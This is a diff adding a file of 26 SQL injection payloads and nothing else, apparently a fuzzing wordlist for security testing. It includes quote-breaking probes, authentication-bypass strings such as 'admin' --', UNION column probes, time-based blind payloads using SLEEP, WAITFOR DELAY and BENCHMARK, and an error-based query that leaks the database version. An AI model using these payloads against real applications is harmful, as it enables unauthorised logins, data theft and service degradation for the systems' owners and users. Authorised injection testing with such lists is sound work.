@@ -1,0 +1,26 @@
+'
+"
+`
+)
+';--
+'); --
+'#
+"#
+' OR '1'='1
+' OR 1=1--
+" OR "" = "
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+') OR ('1'='1
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1 AND BENCHMARK(5000000,MD5('a'))
+1' AND 1=CONVERT(int,(SELECT @@version))--
+admin' --
+admin' #
+admin'/*
+1' ORDER BY 100--
+') OR SLEEP(5)#
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
